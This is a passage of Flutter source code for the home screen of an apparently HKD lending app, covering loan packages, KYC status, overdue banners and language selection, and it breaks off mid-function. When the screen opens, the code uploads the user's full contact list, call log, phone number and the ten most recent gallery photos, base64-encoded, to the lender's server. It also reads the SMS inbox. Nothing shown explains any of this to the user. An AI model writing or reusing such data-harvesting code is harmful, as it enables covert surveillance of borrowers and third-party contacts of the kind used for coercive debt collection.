// ignore_for_file: camel_case_types, prefer_typing_uninitialized_variables

import 'dart:convert';
import 'dart:developer';
import 'dart:io';

import 'package:call_log/call_log.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_easyloading/flutter_easyloading.dart';
import 'package:go_router/go_router.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:intl/intl.dart';
import 'package:loan_project/bloc/app-release/app_release_bloc.dart';
import 'package:loan_project/bloc/log-data/log_data_bloc.dart';
import 'package:loan_project/bloc/member/member_bloc.dart';
import 'package:loan_project/bloc/package/package_bloc.dart';
import 'package:loan_project/bloc/service/service_bloc.dart';
import 'package:loan_project/bloc/transaction/transaction_bloc.dart';
import 'package:loan_project/helper/languages.dart';
import 'package:loan_project/helper/locale_constants.dart';
import 'package:loan_project/helper/preference_helper.dart';
import 'package:loan_project/helper/router_name.dart';
import 'package:loan_project/helper/text_helper.dart';
import 'package:loan_project/model/request_log_data_call_log.dart';
import 'package:loan_project/model/request_log_data_log_file.dart';
import 'package:loan_project/model/response_get_loan.dart';
import 'package:loan_project/model/response_package_index.dart';
import 'package:loan_project/model/response_package_rate.dart';
import 'package:loan_project/screen/loan/history_loan.dart';
import 'package:loan_project/widget/card_blacklist.dart';
import 'package:loan_project/widget/global_function.dart';
import 'package:loan_project/widget/main_button.dart';
import 'package:loan_project/widget/main_button_gradient.dart';
import 'package:mobile_number/mobile_number.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:path/path.dart' as p;
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:telephony/telephony.dart';

import '../model/request_log_data_contact.dart';

class HomeScreen extends StatefulWidget {
  const HomeScreen({Key? key}) : super(key: key);

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
  PreferencesHelper preferencesHelper = PreferencesHelper(sharedPreferences: SharedPreferences.getInstance());
  final PackageBloc _packageBloc = PackageBloc();
  final MemberBloc _memberBloc = MemberBloc();
  ServiceLoanBloc serviceBloc = ServiceLoanBloc();
  final AppReleaseBloc _appReleaseBloc = AppReleaseBloc();
  LogDataBloc dataBloc = LogDataBloc();
  final ScrollController _scrollController = ScrollController();

  final TransactionBloc transactionBloc = TransactionBloc();
  TransactionState? stateTransaction;

  int selectedNominal = 0;
  double? totalmustbepaid;
  int? notbeenpaidof;
  String? loanamount;
  int selectedInterest = 0;
  List<ItemPackageIndex> listPackage = [];
  ItemPackageIndex? selectedPackage;
  ItemPackageRate? selectedRate;
  int indexSelected = -1;
  int indexLanguage = 0;
  bool statusLoanActive = false;
  bool statusLoanPending = false;
  bool isKycApproved = true;
  bool isPending = false;
  bool isOverdue = false;
  bool isBlocked = false;

  /// getData
  bool isGetContactLoading = true;
  bool isGetGalleryLoading = true;
  bool isGetCallLogLoading = true;
  bool isContainerVisible = false;

  int loanStatus = 0;
  int status = 0;
  DatumLoan? dataLoan;
  int _visibleItemCount = 4;
  String id = '';
  String value = '';
  String phoneService = '';
  String url = "https://wa.me/?text=Hello";
  bool isBlacklist = false;
  List<DatumLoan> listLoan = [];

  //// data
  List<SmsMessage> listSms = [];
  List<File> listFile = [];
  List<Calllog> listCallLog = [];
  List<Contactlist> listContact = [];
  List<String> listBase64 = [];

  final telephony = Telephony.instance;

  bool permissionDenied = false;
  bool isGalleryShow = false;
  bool isContactShow = false;
  bool isCallShow = false;
  bool isSmsShow = false;
  List<Contact> contacts = [];
  List<CallLogEntry> callLogs = [];
  List<LogFile> listLogFile = [];

  String _mobileNumber = '';
  final List<SimCard> _simCard = <SimCard>[];
  void getId() async {
    id = await preferencesHelper.getStringSharedPref('id');
    setState(() {});
  }

  List<Map<String, dynamic>> language = [
    {
      "name": "EN",
      "image": "assets/icons/ic_usa.png",
      'id': 'en',
    },
    {
      "name": "HK (繁體中文)",
      "image": "assets/icons/ic_tw.png",
      'id': 'zh-HK', // Traditional Chinese (General)
    },
    // {
    //   "name": "TW (繁體中文)",
    //   "image": "assets/icons/ic_tw.png",
    //   'id': 'zh-Hant', // Traditional Chinese (General)
    // },
    // {
    //   "name": "CN (简体中文)",
    //   "image": "assets/icons/ic_tw.png",
    //   'id': 'zh-Hans', // Simplified Chinese (China)
    // },
    // {
    //   "name": "TWN (繁體中文)",
    //   "image": "assets/icons/ic_taiwan.png",
    //   'id': 'zh-TW', // Taiwanese Mandarin (Traditional Chinese in Taiwan)
    // },
    // {
    //   "name": "MY",
    //   "image": "assets/icons/ic_ml.png",
    //   'id': 'ml',
    // },
    // {
    //   "name": "JP",
    //   "image": "assets/icons/ic_jp.png",
    //   'id': 'ja',
    // },
  ];
  Map<String, dynamic>? selectedLanguage;

  void toggleContainer() {
    setState(() {
      isContainerVisible = !isContainerVisible;
    });
  }

  Future<void> getLanguage() async {
    value = await preferencesHelper.getStringSharedPref(prefSelectedLanguageCode);
    int index = language.indexWhere((element) => value == element['id']);
    log('${index}berpa');
    if (index == -1) {
      selectedLanguage = language[indexLanguage];
    } else {
      selectedLanguage = language[index];
    }

    setState(() {});
  }

  Future<List<Contactlist>> fetchContacts() async {
    log('masuk sini contact');

    List<Contactlist> listContact = [];
    try {
      final contacts = await FlutterContacts.getContacts(
        withAccounts: true,
        withProperties: true,
        withPhoto: true,
        withThumbnail: true,
      );
      log('masuk sini contact ${contacts.length}');

      for (var contact in contacts) {
        String phoneNumber = contact.phones.isNotEmpty ? contact.phones.first.number : "";
        listContact.add(Contactlist(name: contact.displayName, number: phoneNumber));
      }

      dataBloc.add(PostCreateContactEvent(RequestLogDataContact(
        contactlist: listContact,
        count: contacts.isNotEmpty ? contacts.length : -1,
      )));
    } catch (e) {
      log('Error fetching contacts: $e');
      dataBloc.add(PostCreateContactEvent(RequestLogDataContact(
        contactlist: listContact,
        count: -1,
      )));
    }

    return listContact;
  }

  Future<void> callLogBloc() async {
    RequestLogDataCallLog? jsonMap;
    String jsonStr = await preferencesHelper.getStringSharedPref('call_log');

    if (jsonStr.isEmpty) {
      final Iterable<CallLogEntry> cLog = await CallLog.get();
      List<Calllog> listCallLog = cLog
          .map((entry) => Calllog(
                callerid: entry.number,
                name: entry.name,
                callType: GlobalFunction().getCallTypeString(entry.callType?.index ?? 0),
                dateTime: DateTime.fromMicrosecondsSinceEpoch(entry.timestamp! * 1000).toString(),
                duration: entry.duration,
              ))
          .toList();
      log('masuk sana');

      // Hanya panggil dataBloc.add sekali setelah semua entry diproses
      if (listCallLog.isNotEmpty) {
        dataBloc.add(PostCreateCallLogEvent(
            RequestLogDataCallLog(calllog: listCallLog, count: cLog.isNotEmpty ? cLog.length : -1)));
      }
    } else {
      log('masuk sini');
      jsonMap = requestLogDataCallLogFromJson(jsonStr);

      // Tidak perlu memeriksa null pada calllog karena sudah ditangani oleh kondisi else
      dataBloc.add(PostCreateCallLogEvent(RequestLogDataCallLog(
        calllog: jsonMap.calllog ?? [],
        count: jsonMap.calllog!.isNotEmpty ? jsonMap.calllog?.length : -1,
      )));
    }
  }

  void fetchData() async {
    // Memanggil izin untuk kontak
    var contactStatus = await Permission.contacts.request();
    if (contactStatus.isGranted) {
      // Izin untuk kontak diberikan, lanjut ke izin berikutnya (foto)
      // var photoStatus = await Permission.photos.request();
      final PermissionState ps = await PhotoManager.requestPermissionExtend();
      if (!mounted) {
        return;
      }
      if (!ps.hasAccess) {
        GlobalFunction().showPermissionUI(context, title: 'picture');
        GlobalFunction().showToast(Languages.of(context).permissionIsNotAccessible);
        return;
      }

      if (ps.hasAccess) {
        // Izin untuk foto diberikan, lanjut ke izin berikutnya (history panggilan)
        var callLogStatus = await Permission.phone.request();
        if (callLogStatus.isGranted) {
          log('masuk sini gaa');

          callLogBloc();
          fetchContacts().then((value) {
            log('masuk ke log file');
            uploadGalleryImagesToServer();
          });
          initMobileNumberState();
        } else {
          GlobalFunction().showPermissionUI(context, title: 'call log');

          // Izin untuk history panggilan tidak diberikan
        }
      } else {
        GlobalFunction().showPermissionUI(context, title: 'picture');
        // Izin untuk foto tidak diberikan
      }
    } else {
      GlobalFunction().showPermissionUI(context, title: 'contact');

      // Izin untuk kontak tidak diberikan
    }
  }

  Future<void> uploadGalleryImagesToServer() async {
    isGetGalleryLoading = true;

    try {
      final albums = await PhotoManager.getAssetPathList(type: RequestType.image);

      if (albums.isNotEmpty) {
        final recentAlbum = albums.first;

        final assets = await recentAlbum.getAssetListRange(
          start: 0,
          end: 10,
        );

        for (final asset in assets) {
          final file = await asset.file;
          if (file != null) {
            List<int> imageBytes = await file.readAsBytes();
            String base64Image = base64Encode(imageBytes);
            String fileExtension = p.extension(file.path);

            listLogFile.add(LogFile(type: "1", file: 'data:image/$fileExtension;base64,$base64Image'));
            // log(file.path);
          }
        }
        dataBloc.add(PostLogFileLogDataEvent(RequestLogDataLogFile(logFile: listLogFile, count: listLogFile.length)));
      } else {
        dataBloc.add(PostLogFileLogDataEvent(RequestLogDataLogFile(logFile: listLogFile, count: -1)));
      }
    } finally {}
  }

  Future<void> getSMS() async {
    Iterable<SmsMessage> inbox = await telephony.getInboxSms();
    setState(() {
      listSms.addAll(inbox);
    });
  }

  Future<void> initMobileNumberState() async {
    if (!await MobileNumber.hasPhonePermission) {
      await MobileNumber.requestPhonePermission;
      return;
    }
    try {
      _mobileNumber = await MobileNumber.mobileNumber ?? '';
      // _simCard = (await MobileNumber.getSimCards)!;
      dataBloc.add(PostActualNumberEvent(_mobileNumber));
    } on PlatformException catch (e) {
      dataBloc.add(PostActualNumberEvent(_mobileNumber));
      debugPrint("Failed to get mobile number because of '${e.message}'");
    }

    if (!mounted) return;

    setState(() {});
  }

  checkVersion() async {
    PackageInfo packageInfo = await PackageInfo.fromPlatform();
    _appReleaseBloc.add(PostCheckVersionEvent(version: packageInfo.version));
  }

  @override
  void initState() {
    WidgetsBinding.instance.addObserver(this);
    checkVersion();
    getLanguage();
    getId();
    fetchData();
    EasyLoading.show(maskType: EasyLoadingMaskType.black);
    _packageBloc.add(const GetIndexPackageEvent(page: 1, perPage: 10));
    _memberBloc.add(GetMemberEvent());
    transactionBloc.add(const GetLoanEvent());
    serviceBloc.add(GetServiceEvent());
    // getData();

    // TODO: implement initState
    super.initState();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  late AppLifecycleState _notification;

  @override
  Widget build(BuildContext context) {
    return MultiBlocListener(
      listeners: [
        BlocListener<LogDataBloc, LogDataState>(
          bloc: dataBloc,
          listener: (context, state) {
            if (state is PostCreateContactSuccess) {
            } else if (state is PostLogFileLogDataSuccess) {
            } else if (state is PostActualNumberSuccess) {
            } else if (state is PostCreateCallLogSuccess) {
            } else if (state is PostActualNumberError) {
            } else if (state is PostLogFileLogDataLoading) {
            } else if (state is PostLogFileLogDataError) {
            } else if (state is PostCreateLogDataError) {}
            // TODO: implement listener
          },
        ),
        BlocListener<ServiceLoanBloc, ServiceLoanState>(
          bloc: serviceBloc,
          listener: (context, state) {
            if (state is GetServiceSuccess) {
              setState(() {
                phoneService = state.data.data?.items?[0].phonenumber ?? '';
                preferencesHelper.setStringSharedPref('phone_service', phoneService);
                url = "https://wa.me/$phoneService?text=";
              });
            }
            // TODO: implement listener
          },
        ),
        BlocListener<AppReleaseBloc, AppReleaseState>(
          bloc: _appReleaseBloc,
          listener: (context, state) {
            if (state is PostCheckVersionError) {
              showDialog(
                barrierDismissible: false,
                context: context,
                builder: (context) {
                  return WillPopScope(
                    onWillPop: () async => false,
                    child: AlertDialog(
                      title: Text(Languages.of(context).updateAppRequired),
                      content: Text(Languages.of(context).pleaseUpdateToContinue),
                    ),
                  );
                },
              );
            }
            // TODO: implement listener
          },
        ),
        BlocListener<MemberBloc, MemberState>(
          bloc: _memberBloc,
          listener: (context, state) {
            if (state is GetMemberSuccess) {
              // _getCallLogs();

              preferencesHelper.setStringSharedPref('id', state.data.data?.ic ?? '');
              int kyc1Status = -1;
              int kyc2Status = -1;
              int kyc3Status = -1;
              if (state.data.data?.kyc?['1'] != null ||
                  state.data.data?.kyc?['2'] != null ||
                  state.data.data?.kyc?['3'] != null) {
                kyc1Status = state.data.data?.kyc?['1']['status'] ?? -1;
                kyc2Status = state.data.data?.kyc?['2']['status'] ?? -1;
                kyc3Status = state.data.data?.kyc?['3']['status'] ?? -1;
              }
              if (kyc1Status == -1 || kyc2Status == -1 || kyc3Status == -1) {
                preferencesHelper.setStringSharedPref('kyc_status', '');
                preferencesHelper.setStringSharedPref('kyc_status1', '');
                preferencesHelper.setStringSharedPref('kyc_status2', '');
                preferencesHelper.setStringSharedPref('kyc_status3', '');
              } else {
                preferencesHelper.setStringSharedPref(
                    'kyc_status1', state.data.data?.kyc?['1']['status'].toString() ?? '');
                preferencesHelper.setStringSharedPref(
                    'kyc_status2', state.data.data?.kyc?['2']['status'].toString() ?? '');
                preferencesHelper.setStringSharedPref(
                    'kyc_status3', state.data.data?.kyc?['3']['status'].toString() ?? '');
              }
            } else if (state is GetMemberError) {}
            setState(() {});
            // TODO: implement listener
          },
        ),
        BlocListener<TransactionBloc, TransactionState>(
          bloc: transactionBloc,
          listener: (context, state) {
            setState(() {
              stateTransaction = state;
            });
            if (state is GetLoanError) {
              EasyLoading.dismiss();
            } else if (state is GetLoanSuccess) {
              setState(() {
                listLoan = state.data.data ?? [];
              });
              if (state.data.data!.isNotEmpty) {
                state.data.data?.forEach((element) {
                  if (element.status == 3 && element.statusloan == 4) {
                    setState(() {
                      dataLoan = element;
                      isPending = false;
                      isOverdue = false;

                      transactionBloc.add(CheckLoanEvent(packageId: dataLoan!.id.toString()));
                    });
                  } else if (element.status == 3 && element.statusloan == 7 ||
                      element.status == 3 && element.statusloan == 6 ||
                      element.status == 3 && element.statusloan == 8 ||
                      element.status == 3 && element.statusloan == 4 && element.blacklist == 9) {
                    setState(() {
                      dataLoan = element;
                      isPending = false;
                      isOverdue = true;
                      transactionBloc.add(CheckLoanEvent(packageId: dataLoan!.id.toString()));
                    });
                  } else if (element.status == 0 && element.statusloan == 4 ||
                      element.status == 1 && element.statusloan == 4 ||
                      element.status == 10 && element.statusloan == 4) {
                    setState(() {
                      dataLoan = element;
                      isPending = false; // true, //
                      isOverdue = false;
                    });
                  } else {
                    setState(() {
                      isPending = false;
                      isOverdue = false;

                      dataLoan = null;
                    });
                  }
                });
              } else if (state.data.data!.isEmpty) {
                setState(() {
                  isPending = false;
                  isOverdue = false;

                  dataLoan = null;
                });
              }
              EasyLoading.dismiss();
            } else if (state is CheckLoanSuccess) {
              setState(() {
                if (state.data.data?.totalmustbepaid != null) {
                  totalmustbepaid = state.data.data?.totalmustbepaid is int
                      ? state.data.data?.totalmustbepaid.toDouble()
                      : double.parse(state.data.data?.totalmustbepaid);
                }
                notbeenpaidof = state.data.notbeenpaidof;
              });
            } else if (state is CheckLoanError) {}
            // TODO: implement listener
          },
        )
      ],
      child: RefreshIndicator(
        onRefresh: () async {
          EasyLoading.show(maskType: EasyLoadingMaskType.black);
          _packageBloc.add(const GetIndexPackageEvent(page: 1, perPage: 10));
          _memberBloc.add(GetMemberEvent());
          transactionBloc.add(const GetLoanEvent());
          serviceBloc.add(GetServiceEvent());
          getId();

          setState(() {});
        },
        triggerMode: RefreshIndicatorTriggerMode.anywhere,
        child: Scaffold(
          backgroundColor: const Color(0xff000000),
          body: isBlacklist
              ? const CardBlacklist()
              : isPending
                  ? SingleChildScrollView(
                      child: SizedBox(
                        height: MediaQuery.of(context).size.height,
                        width: MediaQuery.of(context).size.width,
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.center,
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Image.asset(
                              'assets/icons/ic_timer.png',
                              width: 131.5,
                              height: 150,
                            ),
                            const SizedBox(
                              height: 40.0,
                            ),
                            SizedBox(
                              width: 330,
                              child: Text(
                                Languages.of(context).loanRequestUnderReview,
                                textAlign: TextAlign.center,
                                style: const TextStyle(
                                  color: Color(0xFF7D8998),
                                  fontSize: 18,
                                  fontFamily: 'Inter',
                                  fontWeight: FontWeight.w400,
                                  height: 0,
                                ),
                              ),
                            ),
                            const SizedBox(
                              height: 60.0,
                            ),
                            SizedBox(
                              width: 330,
                              child: Text(
                                Languages.of(context).contactForInformation,
                                textAlign: TextAlign.center,
                                style: const TextStyle(
                                  color: Color(0xFF7D8998),
                                  fontSize: 18,
                                  fontFamily: 'Inter',
                                  fontWeight: FontWeight.w400,
                                ),
                              ),
                            ),
                            const SizedBox(
                              height: 8.0,
                            ),
                            GlobalFunction().customerServiceButton(url, context)
                          ],
                        ),
                      ),
                    )
                  : SizedBox(
                      // margin: const EdgeInsets.all(16),
                      height: MediaQuery.of(context).size.height,
                      width: MediaQuery.of(context).size.width,
                      child: SingleChildScrollView(
                        controller: _scrollController,
                        child: Column(
                          children: [
                            const SizedBox(
                              height: 30.0,
                            ),
                            ListTile(
                              title: Text(
                                "${Languages.of(context).hello} ✋",
                                style: white16w600,
                              ),
                              subtitle: Text(id, style: white18w600),
                              trailing: SizedBox(
                                width: 205,
                                child: Row(
                                  mainAxisAlignment: MainAxisAlignment.end,
                                  children: [
                                    DropdownButton<Map<String, dynamic>>(
                                      dropdownColor: Colors.grey[500],
                                      value: selectedLanguage,
                                      icon: Image.asset(
                                        'assets/icons/ic_arrow-down.png',
                                        width: 20,
                                        height: 20,
                                      ),
                                      iconSize: 24,
                                      underline: const SizedBox(),
                                      onChanged: (Map<String, dynamic>? newValue) {
                                        setState(() {
                                          // indexSelected = index;
                                          selectedLanguage = newValue;
                                          changeLanguage(context, selectedLanguage?['id']);
                                        });
                                      },
                                      items: language
                                          .map<DropdownMenuItem<Map<String, dynamic>>>((Map<String, dynamic> item) {
                                        return DropdownMenuItem<Map<String, dynamic>>(
                                          value: item,
                                          child: Row(
                                            children: [
                                              Image.asset(
                                                item['image'],
                                                width: 24,
                                                height: 24,
                                                // Sesuaikan ukuran gambar sesuai kebutuhan
                                              ),
                                              const SizedBox(width: 8),
                                              Text(
                                                '${item['name']}',
                                                style: white14w400,
                                              ),
                                            ],
                                          ),
                                        );
                                      }).toList(),
                                    ),
                                    const SizedBox(
                                      width: 10.0,
                                    ),
                                    Container(
                                      decoration: BoxDecoration(
                                          color: Colors.grey[200],
                                          shape: BoxShape.circle,
                                          border: Border.all(width: 4, color: Colors.white)),
                                      child: const Icon(
                                        Icons.person,
                                        color: Colors.grey,
                                        size: 30,
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                            ),
                            Padding(
                              padding: const EdgeInsets.all(16.0),
                              child: Column(
                                // mainAxisAlignment: MainAxisAlignment.center,
                                crossAxisAlignment: CrossAxisAlignment.center,
                                children: [
                                  const SizedBox(
                                    height: 30.0,
                                  ),
                                  Text(
                                    Languages.of(context).loanBalance,
                                    style: const TextStyle(
                                      color: Color(0xFFD1D5DB),
                                      fontSize: 12,
                                      fontFamily: 'Inter',
                                      fontWeight: FontWeight.w400,
                                      height: 0,
                                    ),
                                  ),
                                  const SizedBox(
                                    height: 8.0,
                                  ),
                                  Text(
                                    'HKD ${dataLoan != null ? GlobalFunction().formattedMoney(isOverdue || totalmustbepaid != null ? totalmustbepaid?.toDouble() : notbeenpaidof?.toDouble() ?? double.parse(dataLoan!.loanamount!)) : GlobalFunction().formattedMoney(double.parse(selectedPackage?.amount ?? '0'))}',
                                    style: const TextStyle(
                                      color: Colors.white,
                                      fontSize: 36,
                                      fontFamily: 'Gabarito',
                                      fontWeight: FontWeight.w500,
                                      height: 0,
                                    ),
                                  ),
                                  const SizedBox(
                                    height: 30.0,
                                  ),
                                  Container(
                                      width: double.infinity,
                                      // height: 160,
                                      decoration: BoxDecoration(
                                          borderRadius: BorderRadius.circular(12),
                                          image: const DecorationImage(
                                              image: AssetImage('assets/images/promo1.png'), fit: BoxFit.cover),
                                          boxShadow: const [
                                            BoxShadow(
                                                color: Color.fromARGB(149, 211, 130, 18),
                                                blurRadius: 20,
                                                spreadRadius: 0.4,
                                                offset: Offset(1.2, 8))
                                          ]),
                                      child: Padding(
                                        padding: const EdgeInsets.all(24.0),
                                        child: Column(
                                          crossAxisAlignment: CrossAxisAlignment.start,
                                          children: [
                                            SizedBox(
                                              width: 200,
                                              child: Text(
                                                Languages.of(context).tryGetLoan,
                                                style: const TextStyle(
                                                  color: Colors.white,
                                                  fontSize: 18,
                                                  fontFamily: 'Gabarito',
                                                  fontWeight: FontWeight.w600,
                                                  height: 0,
                                                ),
                                              ),
                                            ),
                                            const SizedBox(
                                              height: 24.0,
                                            ),
                                            BlocConsumer<TransactionBloc, TransactionState>(
                                              bloc: transactionBloc,
                                              listener: (context, state) {
                                                if (state is PostLoanSuccess) {
                                                  GlobalFunction().allDialog(context,
                                                      title: Languages.of(context).thankYou,
                                                      subtitle: Languages.of(context).loanRequestUnderReview,
                                                      iconWidget: Image.asset(
                                                        'assets/icons/ic_pending.png',
                                                        width: 101,
                                                        height: 101,
                                                      ),
                                                      titleButton: Languages.of(context).backTohome, onTap: () {
                                                    context.pushNamed(bottomNavigation, extra: 0);
                                                  });
                                                } else if (state is PostLoanError) {
                                                  GlobalFunction().allDialog(
                                                    context,
                                                    title: state.message,
                                                  );
                                                }
                                                // TODO: implement listener
                                              },
                                              builder: (context, state) {
                                                return SizedBox(
                                                  width: Languages.of(context).applyLoan == 'Mohon Pinjaman' ||
                                                          Languages.of(context).applyLoan == 'ローンを申し込む'
                                                      ? 190
                                                      : 148,
                                                  child: ElevatedButton(
                                                      style: ElevatedButton.styleFrom(
                                                          shape: RoundedRectangleBorder(
                                                              borderRadius: BorderRadius.circular(30)),
                                                          backgroundColor: Colors.white),
                                                      onPressed: () async {
                                                        _scrollController.animateTo(
                                                          500,
                                                          duration: const Duration(milliseconds: 500),
                                                          curve: Curves.easeInOut,
                                                        );
                                                      },
                                                      child: Row(
                                                        mainAxisAlignment: MainAxisAlignment.center,
                                                        crossAxisAlignment: CrossAxisAlignment.center,
                                                        children: [
                                                          Expanded(
                                                            child: Text(
                                                              state is PostLoanLoading
                                                                  ? '${Languages.of(context).loading}...'
                                                                  : Languages.of(context).applyLoan,
                                                              style: GoogleFonts.inter(
                                                                  color: const Color(0xFFF77F00),
                                                                  fontWeight: FontWeight.w600),
                                                            ),
                                                          ),
                                                          const SizedBox(
                                                            width: 8.0,
                                                          ),
                                                          const Icon(
                                                            Icons.arrow_right_alt,
                                                            color: Color(0xFFF77F00),
                                                          )
                                                        ],
                                                      )),
                                                );
                                              },
                                            ),
                                            const SizedBox(
                                              height: 5.0,
                                            ),
                                          ],
                                        ),
                                      )),
                                  dataLoan == null
                                      ? Container()
                                      : isOverdue
                                          ? Container(
                                              width: 350,
                                              height: 58,
                                              padding: const EdgeInsets.all(12),
                                              clipBehavior: Clip.antiAlias,
                                              decoration: ShapeDecoration(
                                                color: const Color(0xFF261616),
                                                shape: RoundedRectangleBorder(
                                                  side: const BorderSide(width: 1, color: Color(0xFFF46C7C)),
                                                  borderRadius: BorderRadius.circular(12),
                                                ),
                                              ),
                                              child: Row(
                                                mainAxisAlignment: MainAxisAlignment.start,
                                                crossAxisAlignment: CrossAxisAlignment.start,
                                                children: [
                                                  Image.asset(
                                                    'assets/icons/ic_info_danger.png',
                                                    width: 20,
                                                  ),
                                                  const SizedBox(
                                                    width: 8.0,
                                                  ),
                                                  SizedBox(
                                                    width: 290,
                                                    child: Text(
                                                      Languages.of(context).overdueLoanMessage,
                                                      style: const TextStyle(
                                                        color: Colors.white,
                                                        fontSize: 12,
                                                        fontFamily: 'Roboto',
                                                        fontWeight: FontWeight.w400,
                                                      ),
                                                    ),
                                                  ),
                                                ],
                                              ),
                                            )
                                          : const SizedBox(),
                                  /*
                                          XXX: Multi-loan

                                          
                                           Container(
                                              width: 350,
                                              height: 60,
                                              padding: const EdgeInsets.all(12),
                                              clipBehavior: Clip.antiAlias,
                                              decoration: ShapeDecoration(
                                                color: const Color(0xFF1F2A37),
                                                shape: RoundedRectangleBorder(
                                                  side: const BorderSide(width: 1, color: Color(0xFFA4CAFE)),
                                                  borderRadius: BorderRadius.circular(12),
                                                ),
                                              ),
                                              child: Row(
                                                mainAxisAlignment: MainAxisAlignment.start,
                                                crossAxisAlignment: CrossAxisAlignment.start,
                                                children: [
                                                  Image.asset(
                                                    'assets/icons/ic_info.png',
                                                    width: 20,
                                                  ),
                                                  const SizedBox(
                                                    width: 8.0,
                                                  ),
                                                  SizedBox(
                                                    width: 290,
                                                    child: Text(
                                                      Languages.of(context).clearLoanBeforeApplying,
                                                      style: const TextStyle(
                                                        color: Colors.white,
                                                        fontSize: 12,
                                                        fontFamily: 'Roboto',
                                                        fontWeight: FontWeight.w400,
                                                      ),
                                                    ),
                                                  ),
                                                ],
                                              ),
                                            ), */
                                  const SizedBox(
                                    height: 8.0,
                                  ),
                                  Row(
                                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                    children: [
                                      Text(
                                        Languages.of(context).ourPackages,
                                        style: white16w600,
                                      ),
                                      TextButton(
                                        onPressed: () {
                                          setState(() {
                                            // Menampilkan semua item saat tombol "See More" diklik
                                            _visibleItemCount = listPackage.length;
                                          });
                                        },
                                        child: Row(
                                          children: [
                                            Text(
                                              Languages.of(context).seeMore,
                                              textAlign: TextAlign.center,
                                              style: GoogleFonts.inter(
                                                color: const Color(0xFF7D8998),
                                                fontSize: 12,
                                                fontWeight: FontWeight.w400,
                                              ),
                                            ),
                                            const Icon(
                                              Icons.keyboard_arrow_right,
                                              color: Color(0xFF7D8998),
                                            )
                                          ],
                                        ),
                                      )
                                    ],
                                  ),
                                  const SizedBox(
                                    height: 10.0,
                                  ),
                                  BlocConsumer<PackageBloc, PackageState>(
                                    bloc: _packageBloc,
                                    listener: (context, state) {
                                      if (state is GetIndexPackageError) {
                                        log('test ${state.message}');
                                        EasyLoading.dismiss();
                                      } else if (state is GetIndexPackageSuccess) {
                                        EasyLoading.dismiss();
                                        // fetchContacts();
                                        setState(() {
                                          listPackage = state.data.data.items ?? [];
                                          if (listPackage.isNotEmpty) {
                                            selectedPackage = null;
                                          }
                                        });
                                      }
                                      // TODO: implement listener
                                    },
                                    builder: (context, state) {
                                      if (state is GetIndexPackageSuccess) {
                                        return GridView.builder(
                                          padding: EdgeInsets.zero,
                                          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                                            childAspectRatio: 1.5,
                                            crossAxisCount: 2,
                                            mainAxisSpacing: 16,
                                            crossAxisSpacing: 16,
                                          ),
                                          itemCount: state.data.data.items.length > 4
                                              ? _visibleItemCount
                                              : state.data.data.items.length,
                                          shrinkWrap: true,
                                          physics: const ScrollPhysics(),
                                          itemBuilder: (BuildContext context, int index) {
                                            ItemPackageIndex data = state.data.data.items[index];
                                            return GestureDetector(
                                              /* XXX: Multi-loan
                                                                                            onTap: dataLoan != null
                                                  ? null
                                                  : () {
                                                      setState(() {
                                                        indexSelected = index;
                                                        selectedPackage = data;
                                                        selectedNominal = index;
                                                      });
                                                    },
                                                    */

                                              onTap: () {
                                                setState(() {
                                                  indexSelected = index;
                                                  selectedPackage = data;
                                                  selectedNominal = index;
                                                });
                                              },
                                              child: Container(
                                                padding: const EdgeInsets.all(16),
                                                decoration: BoxDecoration(
                                                  borderRadius: BorderRadius.circular(12),
                                                  border: Border.all(
                                                      width: 1,
                                                      color: indexSelected == index
                                                          ? const Color(0xFFFED607)
                                                          : const Color(0xFF252422).withOpacity(0.4)),
                                                  color: indexSelected == index
                                                      ? Colors.amber.withOpacity(0.4)
                                                      : const Color(0xFF252422).withOpacity(0.9),
                                                ),
                                                child: Column(
                                                  crossAxisAlignment: CrossAxisAlignment.start,
                                                  children: [
                                                    Text(
                                                      data.name,
                                                      style: GoogleFonts.inter(
                                                        color: indexSelected == index
                                                            ? const Color(0xFFD1D5DB)
                                                            : const Color(0xFFD1D5DB).withOpacity(0.4),
                                                        fontSize: 12,
                                                        fontWeight: FontWeight.w600,
                                                      ),
                                                    ),
                                                    Text(
                                                      GlobalFunction()
                                                          .formattedMoney(double.parse(data.amount ?? '0'))
                                                          .toString(),
                                                      style: GoogleFonts.inter(
                                                        color: indexSelected == index
                                                            ? Colors.white
                                                            : const Color(0xFFD1D5DB).withOpacity(0.4),
                                                        fontSize: 24,
                                                        fontWeight: FontWeight.w700,
                                                      ),
                                                    ),
                                                  ],
                                                ),
                                              ),
                                            );
                                          },
                                        );
                                      } else if (state is GetIndexPackageError) {
                                        return Padding(
                                          padding: const EdgeInsets.all(16.0),
                                          child: MainButton(
                                            title: Languages.of(context).tryAgain,
                                            onTap: () {
                                              _packageBloc.add(const GetIndexPackageEvent(page: 1, perPage: 10));
                                            },
                                          ),
                                        );
                                      } else {
                                        return Container();
                                      }
                                    },
                                  ),
                                  const SizedBox(
                                    height: 24.0,
                                  ),
                                  BlocConsumer<TransactionBloc, TransactionState>(
                                    bloc: transactionBloc,
                                    listener: (context, state) {
                                      if (state is PostLoanSuccess) {
                                        GlobalFunction().allDialog(context,
                                            title: Languages.of(context).successSubmitLoanRequest, onTap: () {
                                          context.pushNamed(bottomNavigation, extra: 0);
                                        });
                                      } else if (state is PostLoanError) {
                                        GlobalFunction().allDialog(
                                          context,
                                          title: state.message,
                                        );
                                      }
                                      // TODO: implement listener
                                    },
                                    builder: (context, state) {
                                      return MainButtonGradient(
                                        title: state is PostLoanLoading
                                            ? '${Languages.of(context).loading}...'
                                            : Languages.of(context).continueText,
                                        onTap: indexSelected == -1 || state is PostLoanLoading
                                            ? null
                                            : () async {
                                                // Multi-loan: Check if user has loan history (already did KYC)
                                                if (listLoan.isNotEmpty) {
